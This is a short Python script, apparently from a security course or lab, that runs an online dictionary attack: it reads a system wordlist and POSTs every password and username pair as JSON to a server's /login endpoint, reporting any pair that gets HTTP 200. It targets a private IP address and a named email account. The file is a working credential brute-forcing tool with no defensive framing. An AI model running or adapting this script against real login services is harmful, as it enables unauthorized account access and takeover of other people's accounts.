from json import dumps
from os.path import exists
from requests import post as post_request


class DictionaryAttack:
    def __init__(self, server, usernames):
        """
        Args:
            server (str) - the server url
            usernames (List) - the login usernames
        """

        self.server = server
        self.usernames = usernames

    def load_password_list(self, filename):
        """Return a list of passwords to be tried for the dictionary attack.

        Args:
            filename (str) - the passwords file

        Returns:
            A list of passwords to be tried
        """

        if exists(filename):
            return [p.strip() for p in open(filename, 'r').readlines()]
        return None

    def launch_attack(self, passwords):
        """Launch a passwords dictionary attack using the given passwords.

        Args:
            passwords (List) - a list of passwords to be tried
        """

        server = self.server + '/login'

        for password in passwords:
            for username in self.usernames:
                data = dumps({'username': username, 'password': password})
                response = post_request(server, data=data)

                if response.status_code == 200:
                    print(f'Password found for {username} -> {password}')
                    return


if __name__ == '__main__':
    attack = DictionaryAttack(
        'http://192.168.0.172:8888',
        ['sashank_narain@uml.edu']
    )

    passwords = attack.load_password_list('/usr/share/dict/words')
    attack.launch_attack(passwords)
